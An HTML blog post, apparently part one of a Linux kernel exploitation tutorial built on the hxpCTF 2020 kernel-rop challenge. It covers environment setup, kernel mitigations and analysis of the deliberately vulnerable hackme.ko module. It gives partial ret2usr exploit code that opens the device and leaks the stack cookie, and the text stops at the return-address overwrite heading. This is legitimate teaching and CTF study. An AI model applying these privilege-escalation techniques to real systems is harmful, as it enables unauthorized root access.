<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Learning Linux Kernel Exploitation - Part 1 - Midas Blog</title><meta name="Description" content="The first part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Setting up the environment and the simplest technique of ret2usr"><meta property="og:title" content="Learning Linux Kernel Exploitation - Part 1" />
<meta property="og:description" content="The first part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Setting up the environment and the simplest technique of ret2usr" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/" />
<meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/>
<meta property="article:published_time" content="2021-01-23T16:33:12+07:00" />
<meta property="article:modified_time" content="2021-01-23T16:33:12+07:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>

<meta name="twitter:title" content="Learning Linux Kernel Exploitation - Part 1"/>
<meta name="twitter:description" content="The first part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Setting up the environment and the simplest technique of ret2usr"/>
<meta name="application-name" content="Midas Blog">
<meta name="apple-mobile-web-app-title" content="Midas Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/" /><link rel="prev" href="https://lkmidas.github.io/posts/20210103-tetctf2021-writeups/" /><link rel="next" href="https://lkmidas.github.io/posts/linux-kernel-pwn-part-2/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Learning Linux Kernel Exploitation - Part 1",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/lkmidas.github.io\/posts\/20210123-linux-kernel-pwn-part-1\/"
        },"genre": "posts","wordcount":  3565 ,
        "url": "https:\/\/lkmidas.github.io\/posts\/20210123-linux-kernel-pwn-part-1\/","datePublished": "2021-01-23T16:33:12+07:00","dateModified": "2021-01-23T16:33:12+07:00","publisher": {
            "@type": "Organization",
            "name": "Midas"},"author": {
                "@type": "Person",
                "name": "Midas"
            },"description": "The first part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Setting up the environment and the simplest technique of ret2usr"
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Midas Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/avatar.png"
        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
        data-sizes="auto"
        alt="/images/avatar.png"
        title="/images/avatar.png" /></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/lkmidas/lkmidas.blog" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Midas Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/avatar.png"
        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
        data-sizes="auto"
        alt="/images/avatar.png"
        title="/images/avatar.png" /></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/lkmidas/lkmidas.blog" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">Learning Linux Kernel Exploitation - Part 1</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Midas</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwning/"><i class="far fa-folder fa-fw"></i>pwning</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-23">2021-01-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3565 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;17 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#setting-up-the-environment">Setting up the environment</a>
      <ul>
        <li><a href="#first-look">First look</a></li>
        <li><a href="#the-kernel">The kernel</a></li>
        <li><a href="#the-file-system">The file system</a></li>
        <li><a href="#the-qemu-run-script">The qemu run script</a></li>
      </ul>
    </li>
    <li><a href="#linux-kernel-mitigation-features">Linux kernel mitigation features</a></li>
    <li><a href="#analyzing-the-kernel-module">Analyzing the kernel module</a></li>
    <li><a href="#the-simplest-exploit---ret2usr">The simplest exploit - ret2usr</a>
      <ul>
        <li><a href="#concept">Concept</a></li>
        <li><a href="#opening-the-device">Opening the device</a></li>
        <li><a href="#leaking-stack-cookies">Leaking stack cookies</a></li>
        <li><a href="#overwriting-return-address">Overwriting return address</a></li>
        <li><a href="#getting-root-privileges">Getting root privileges</a></li>
        <li><a href="#returning-to-userland">Returning to userland</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#appendix">Appendix</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="preface">Preface</h2>
<p>In this series, I&rsquo;m going to write about some basic stuffs in Linux kernel exploitation that I have learned in the last few weeks: from basic environment setup to some popular Linux kernel mitigations, and their corresponding exploitation techniques.</p>
<p>Back when I first started playing CTF and pwning about 2 years ago, everytime I heard other people talked about kernel exploitation, it was like a very difficult and magical topic to me, I tried to get into it several times, but always didn&rsquo;t know how to start because I didn&rsquo;t have the sufficient knowledge about kernels and operating systems at that point. A few weeks earlier, after having learned a lot more about computer science in general and operating systems in particular, I decided to try learning kernel pwning again, from the very basic. I know it&rsquo;s pretty late for a pwner like me to start learning this subject after so long, but as they always say, it&rsquo;s better late than never. It turns out that this topic is not as difficult as I have always thought it to be (but for sure it&rsquo;s not easy, remember that this is just the very basics that I have learned), it just requires a lot more initial in-depth knowledge and setup than normal userspace exploitation does. <em>Therefore, it requires pwners to be quite comfortable with userland exploitation before getting into kernel exploitation</em>.</p>
<p>For the learning process, I used the environment provided by a challenge from <code>hxpCTF 2020</code> called <code>kernel-rop</code> to practice on. <em>Keep in mind that I only used it as a practice environment, this is not an actual writeup of the challenge itself</em> (even though the environment configuration in the last post may be the same as the challenge, so you can call that a writeup). The reason I chose this particular challenge is because:</p>
<ol>
<li>The configuration is quite standard and easy to modify to my practicing needs.</li>
<li>The bug in the kernel module is extremely trivial and basic.</li>
<li>The kernel version is quite new (at the time I wrote this post, of course).</li>
</ol>
<p>For me, this series serves as a reminder, an exploitation template for me to look back on and reuse in the future, but if it could help someone on their first steps into Linux kernel exploitation for just a little bit, I would be very delighted.</p>
<p>So let&rsquo;s start the first post of the series, where I demonstrate the most basic way to setup a Linux kernel pwn environment, and the most basic exploitation technique.</p>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><em>Use the table of contents on the right to navigate to the section that you are interested in.</em></div>
        </div>
    </div>
<h2 id="setting-up-the-environment">Setting up the environment</h2>
<h3 id="first-look">First look</h3>
<p>For a Linux kernel pwn challenge, our task is to exploit <strong>a vulnearable custom kernel module</strong> that is installed into the kernel on boot. In most cases, the module will be given along with some files that ultimately use <code>qemu</code> as the emulator for a Linux system. However in some rare cases, we might be given with a <code>VMWare</code> or <code>VirtualBox</code> VM image, or might not be given any emulation environment at all, but according to all the challenges that I have sampled, those are quite rare, so I will only explain the common cases, which are emulated by <code>qemu</code>.</p>
<p>In particular, for the <code>kernel-rop</code> challenge, we are given a lot of files, but only these files are important for the <code>qemu</code> setup:</p>
<ul>
<li><a href="/posts/20210123-linux-kernel-pwn-part-1/vmlinuz" rel="">vmlinuz</a> - the compressed Linux kernel, sometimes it&rsquo;s called <code>bzImage</code>, we can extract it into the actual kernel ELF file called <code>vmlinux</code>.</li>
<li><a href="/posts/20210123-linux-kernel-pwn-part-1/initramfs.cpio.gz" rel="">initramfs.cpio.gz</a> - the Linux file system that is compressed with <code>cpio</code> and <code>gzip</code>, directories such as <code>/bin</code>, <code>/etc</code>, &hellip; are stored in this file, also the vulnearable kernel module is likely to be included in the file system as well. For other challenges, this file might come in some other compression schemes.</li>
<li><a href="/posts/20210123-linux-kernel-pwn-part-1/run.sh" rel="">run.sh</a> - the shell script that contains <code>qemu</code> run command, we can change the <code>qemu</code> and Linux boot configuration here.</li>
</ul>
<p>Let&rsquo;s take a deeper look at each of these files to find out what we should do with them, one by one.</p>
<h3 id="the-kernel">The kernel</h3>
<p>The Linux kernel, which is often given under the name of <a href="/posts/20210123-linux-kernel-pwn-part-1/vmlinuz" rel="">vmlinuz</a> or <code>bzImage</code>, is the compressed version of the kernel image called <code>vmlinux</code>. There can be some different compression schemes that are used like <code>gzip</code>, <code>bzip2</code>, <code>lzma</code>, etc. Here I used a script called <a href="/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh" rel="">extract-image.sh</a> to extract the kernel ELF file:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./extract-image.sh ./vmlinuz &gt; vmlinux
</code></pre></div><p>The reason for extracting the kernel image is to find <code>ROP gadgets</code> inside it. If you are already familiar with userland pwning, you know what <code>ROP</code> is, and in the kernel, it&rsquo;s not much different (we will see in later posts). I personally prefer using <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener noreffer">ROPgadget</a> to do the job:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ROPgadget --binary ./vmlinux &gt; gadgets.txt
</code></pre></div><p>Keep in mind that unlike a simple userland program, the kernel image is <strong>HUGE</strong>. Therefore, <code>ROPgadget</code> will take a very long time finding all the gadgets and you have to just wait for it, so it is wise to immediately look for gadgets at the beginning of the pwning process. It is also wise to save the output into a file, you don&rsquo;t want to run <code>ROPgadget</code> multiple times to look for multiple different gadgets.</p>
<h3 id="the-file-system">The file system</h3>
<p>Again, this is a compressed file, I use this script <a href="/posts/20210123-linux-kernel-pwn-part-1/decompress.sh" rel="">decompress.sh</a> to decompress the file:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">mkdir initramfs
<span class="nb">cd</span> initramfs
cp ../initramfs.cpio.gz .
gunzip ./initramfs.cpio.gz
cpio -idm &lt; ./initramfs.cpio
rm initramfs.cpio
</code></pre></div><p>After running the script, we have a directory <code>initramfs</code> which looks like the root directory of a file system on a Linux machine. We can also see that in this case, the vulnearable kernel module <a href="/posts/20210123-linux-kernel-pwn-part-1/hackme.ko" rel="">hackme.ko</a> is also included in the root directory, we will copy it to somewhere else to analyze later.</p>
<p>The reason we decompress this file is not only to get the vulnearable module, but also to modify something in this file system to our need. Firstly, we can look into <code>/etc</code> directory, because most of the init scripts that are run after booting is stored here. In particular, we look for the following line in one of the files (usually it will be <code>rcS</code> or <code>inittab</code>) and then modify it:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">setuidgid <span class="m">1000</span> /bin/sh
<span class="c1"># Modify it into the following</span>
setuidgid <span class="m">0</span> /bin/sh
</code></pre></div><p>The purpose of this line is to spawn a <strong>non-root shell</strong> with UID <code>1000</code> after booting. After modifying the UID to <code>0</code>, we will have a <strong>root shell</strong> on startup. You may ask: <em>why should we do this?</em> Indeed, this seems quite contradictory, because our goal is to exploit the kernel module to gain root, not to modify the file system (of course we cannot modify the file system on the challenge&rsquo;s remote server). The ultimate reason here is just to simplify the exploitation process. There are some files that contain useful information for us when developing the exploitation code, but they require root access to read, for example:</p>
<ul>
<li><code>/proc/kallsyms</code> lists all the addresses of all symbols loaded into the kernel.</li>
<li><code>/sys/module/core/sections/.text</code> shows the address of kernel <code>.text</code> section, which is also its base address (even though in the case of this challenge, there is no such <code>/sys</code> directory, you can still retrieve the base address from <code>/proc/kallsyms</code> though).</li>
</ul>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw"></i>Warning<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><em>Remember to set this back to <code>1000</code> when running the exploitation code, to avoid false positive while exploiting (you may think you have a root shell after exploiting, but you don&rsquo;t).</em></div>
        </div>
    </div>
<p>Secondly, we decompress the file system to put our exploitation program into it later. After modifying it, I use this script <a href="/posts/20210123-linux-kernel-pwn-part-1/compress.sh" rel="">compress.sh</a> to compress it back into the given format:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">gcc -o exploit -static <span class="nv">$1</span>
mv ./exploit ./initramfs
<span class="nb">cd</span> initramfs
find . -print0 <span class="se">\
</span><span class="se"></span><span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc <span class="se">\
</span><span class="se"></span><span class="p">|</span> gzip -9 &gt; initramfs.cpio.gz
mv ./initramfs.cpio.gz ../
</code></pre></div><p>The first 2 lines are to compile the exploitation code and put it into the file system.</p>
<h3 id="the-qemu-run-script">The qemu run script</h3>
<p>Initially, the given <a href="/posts/20210123-linux-kernel-pwn-part-1/run.sh" rel="">run.sh</a> looks like this:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">qemu-system-x86_64 <span class="se">\
</span><span class="se"></span>    -m 128M <span class="se">\
</span><span class="se"></span>    -cpu kvm64,+smep,+smap <span class="se">\
</span><span class="se"></span>    -kernel vmlinuz <span class="se">\
</span><span class="se"></span>    -initrd initramfs.cpio.gz <span class="se">\
</span><span class="se"></span>    -hdb flag.txt <span class="se">\
</span><span class="se"></span>    -snapshot <span class="se">\
</span><span class="se"></span>    -nographic <span class="se">\
</span><span class="se"></span>    -monitor /dev/null <span class="se">\
</span><span class="se"></span>    -no-reboot <span class="se">\
</span><span class="se"></span>    -append <span class="s2">&#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34;</span>
</code></pre></div><p>Some notable flags are:</p>
<ul>
<li><code>-m</code> specifies the memory size, if for some reasons you cannot boot the emulator, you can try increase this size.</li>
<li><code>-cpu</code> specifies the CPU model, here we can add <code>+smep</code> and <code>+smap</code> for SMEP and SMAP mitigation features (more on this later).</li>
<li><code>-kernel</code> specifies the compressed kernel image.</li>
<li><code>-initrd</code> specifies the compressed file system.</li>
<li><code>-append</code> specifies additional boot options, this is also where we can enable/disable mitigation features.</li>
<li>All the other options can be found in the <a href="https://manpages.debian.org/jessie/qemu-system-x86/qemu-system-x86_64.1.en.html" target="_blank" rel="noopener noreffer">QEMU documentation</a>.</li>
</ul>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><em>This challenge uses <code>-hdb</code> to put <code>flag.txt</code> into <code>/dev/sda</code> instead of leaving the <code>flag.txt</code> as a normal file in the system. This is maybe to prevent some dirty CTF tricks used by pwners, or maybe just to make the challenge easier to deploy.</em></div>
        </div>
    </div>
<p>The first thing that should be done here is to add <code>-s</code> option to it. This options allows us to debug the emulator&rsquo;s kernel remotely from our host machine. All we need to do is to boot the emulator up like normal, then in the host machine, run:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ gdb vmlinux
<span class="o">(</span>gdb<span class="o">)</span> target remote localhost:1234
</code></pre></div><p>Then, we can debug the system&rsquo;s kernel normally, just like when we attach <code>gdb</code> to a normal userland process.</p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><em>You might want to disable <code>peda</code>, <code>pwndbg</code> or <code>GEF</code> when debugging remote kernel, because sometimes they might behave weirdly. Simply use <code>gdb --nx vmlinux</code>.</em></div>
        </div>
    </div>
<p>The second thing we can do is modify the mitigation features to our practice needs. Of course, when facing a real challenge in a CTF, we may not want to do this, but again, this is me practicing different exploitation techniques in different scenarios, so modifying them is perfectly fine.</p>
<h2 id="linux-kernel-mitigation-features">Linux kernel mitigation features</h2>
<p>Just like mitigation features such as <code>ASLR</code>, <code>stack canaries</code>, <code>PIE</code>, etc. used by userland programs, kernel also have their own set of mitigation features. Below are some of the popular and notable Linux kernel mitigation features that I consider when learning kernel pwn:</p>
<ul>
<li><a href="http://www.phrack.org/issues/49/14.html#article" target="_blank" rel="noopener noreffer">Kernel stack cookies (or canaries)</a> - this is exactly the same as stack canaries on userland. It is enabled in the kernel at compile time and cannot be disabled.</li>
<li><a href="https://lwn.net/Articles/569635/" target="_blank" rel="noopener noreffer">Kernel address space layout randomization (KASLR)</a> - also like <code>ASLR</code> on userland, it randomizes the base address where the kernel is loaded each time the system is booted. It can be enabled/disabled by adding <code>kaslr</code> or <code>nokaslr</code> under <code>-append</code> option.</li>
<li><a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf" target="_blank" rel="noopener noreffer">Supervisor mode execution protection (SMEP)</a> - this feature marks all the userland pages in the page table as non-executable when the process is in kernel-mode. In the kernel, this is enabled by setting the <code>20th bit</code> of Control Register <code>CR4</code>. On boot, it can be enabled by adding <code>+smep</code> to <code>-cpu</code>, and disabled by adding <code>nosmep</code> to <code>-append</code>.</li>
<li><a href="https://lwn.net/Articles/517475/" target="_blank" rel="noopener noreffer">Supervisor Mode Access Prevention (SMAP)</a> - complementing <code>SMEP</code>, this feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written as well. In the kernel, this is enabled by setting the <code>21st bit</code> of Control Register <code>CR4</code>. On boot, it can be enabled by adding <code>+smap</code> to <code>-cpu</code>, and disabled by adding <code>nosmap</code> to <code>-append</code>.</li>
<li><a href="https://lwn.net/Articles/741878/" target="_blank" rel="noopener noreffer">Kernel page-table isolation (KPTI)</a> - when this feature is active, the kernel separates user-space and kernel-space page tables entirely, instead of using just one set of page tables that contains both user-space and kernel-space addresses. One set of page tables includes both kernel-space and user-space addresses same as before, but it is only used when the system is running in kernel mode. The second set of page tables for use in user mode contains a copy of user-space and a <em>minimal set of kernel-space addresses</em>. It can be enabled/disabled by adding <code>kpti=1</code> or <code>nopti</code> under <code>-append</code> option.</li>
</ul>
<p>The way I learned, I started out with the least mitigation features enabled: only <code>stack cookies</code>, then gradually adding each of them one-by-one in order to learn different techniques that I can use in different cases. But first, let&rsquo;s analyze the vulnearable <a href="/posts/20210123-linux-kernel-pwn-part-1/hackme.ko" rel="">hackme.ko</a> module itself.</p>
<h2 id="analyzing-the-kernel-module">Analyzing the kernel module</h2>
<p>The module is absolutely simple. First, in <code>hackme_init()</code>, it registers a device named <code>hackme</code> with the following operations: <code>hackme_read</code>, <code>hackme_write</code>, <code>hackme_open</code> and <code>hackme_release</code>. This means that we can communicate with this module by opening <code>/dev/hackme</code> and perform read or write on it.</p>
<p>Performing read or write on the device will make a call to <code>hackme_read()</code> or <code>hackme_write()</code> in the kernel, their code is as follow (using IDA pro, some irrelevant parts are omitted):</p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
<span class="p">{</span>   
    <span class="c1">//...
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="c1">//...
</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
        <span class="n">BUG</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
    <span class="n">_memcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">);</span>
    <span class="c1">//...
</span><span class="c1"></span><span class="p">}</span>

<span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
<span class="p">{</span>   
    <span class="c1">//...
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="c1">//...
</span><span class="c1"></span>    <span class="n">_memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
        <span class="n">BUG</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
    <span class="c1">//...
</span><span class="c1"></span><span class="p">}</span>
</code></pre></div><p>The bugs in these 2 functions are pretty clear: They both read/write to a stack buffer that is 0x80 bytes in length, but only alert a buffer overflow if the size is larger than 0x1000. Using this bug, we can freely read from/write to the kernel stack.</p>
<p>Now, let&rsquo;s see what we can do with the above primitives to achieve root privileges, starting with the least mitigation features possible: only <code>stack cookies</code>.</p>
<h2 id="the-simplest-exploit---ret2usr">The simplest exploit - ret2usr</h2>
<h3 id="concept">Concept</h3>
<p>Recall when we first learn userland pwn, most of us may have done a simple stack buffer overflow challenge where <code>ASLR</code> is disabled and <code>NX</code> bit is not set. In such case, what we actually did was using a technique calls <code>ret2shellcode</code>, where we put our shellcode somewhere on the stack, then debug to find out its address and overwrite the return address of the current function with what we found.</p>
<p><strong>Return-to-user</strong> - a.k.a. <code>ret2usr</code> - originates from a pretty similar idea. Here, instead of putting a shellcode on the stack, because we have full control of what presents in the <code>userland</code>, we can put the piece of code which we want the program&rsquo;s flow to jump into in the <code>userland</code> itself. After that, we simply overwrite the return address of the function that is being called in the kernel with that address. Because the vulnearable function is a kernel function, our code - even though being in the <code>userland</code> - is executed under <code>kernel-mode</code>. By this way, we have already achieved arbitrary code execution.</p>
<p>In order for this technique to work, we will remove most of the mitigation features in the <code>qemu</code> run script by removing <code>+smep</code>, <code>+smap</code>, <code>kpti=1</code>, <code>kaslr</code> and adding <code>nopti</code>, <code>nokaslr</code>.</p>
<p>Since this is the first technique in the series, I will explain the exploitation process step by step.</p>
<h3 id="opening-the-device">Opening the device</h3>
<p>First of all, before we can interact with the module, we have to open it first. The function to open the device is as simple as open a normal file:</p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">open_dev</span><span class="p">(){</span>
    <span class="n">global_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">global_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>After doing this, we can now read and write to <code>global_fd</code>.</p>
<h3 id="leaking-stack-cookies">Leaking stack cookies</h3>
<p>Because we have arbitrary stack read, leaking is trivial. The <code>tmp</code> buffer on the stack itself is 0x80 bytes long, and the stack cookie is immediately after it. Therefore, if we read the data to a <code>unsigned long</code> array (of which each element is 8 bytes), the cookie will be at offset 16:</p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cookie</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
    <span class="n">cookie</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><h3 id="overwriting-return-address">Overwriting return address</h3>
